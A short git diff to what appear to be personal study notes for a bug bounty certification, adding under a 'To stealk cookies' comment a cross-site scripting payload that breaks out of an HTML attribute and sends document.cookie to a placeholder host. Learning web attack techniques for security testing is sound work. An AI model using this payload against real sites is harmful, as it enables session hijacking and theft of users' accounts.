@@ -48,4 +48,7 @@ Stuff for CBBH
 
     #That's a way to remove unanted html stuff from the page [gotta wrap it between script tags]
     document.getElementById("id-here").remove();
-    
+
+
+    #To stealk cookies
+    "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>
